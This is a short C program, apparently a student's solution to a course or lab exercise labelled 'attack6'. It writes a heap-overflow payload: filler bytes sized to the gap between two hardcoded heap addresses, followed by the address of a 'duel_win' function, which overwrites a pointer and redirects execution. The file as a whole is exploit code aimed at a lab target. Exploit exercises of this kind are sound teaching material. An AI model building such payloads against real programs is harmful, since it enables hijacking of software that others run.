#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util-program.h"


int main(int argc, char **argv)
{
    /* YOUR CODE: Generate buf appropriately */
    long duel_win_addr = 0x804923d;
    long master_heap_addr = 0x804d1a0;
    long ship_ptr_heap_addr = 0x804d1d0;

    int offset = ship_ptr_heap_addr - master_heap_addr;
    printf("Offset6: %d\n", offset);

    char attack6_buffer[offset + 4];
    memset(attack6_buffer, '*', offset);
    memcpy(attack6_buffer + offset, &duel_win_addr, 4);

    write_to_file( "payloads/attack6-payload", attack6_buffer , sizeof(attack6_buffer) , FILE_CLEAR );
    exit(0);
}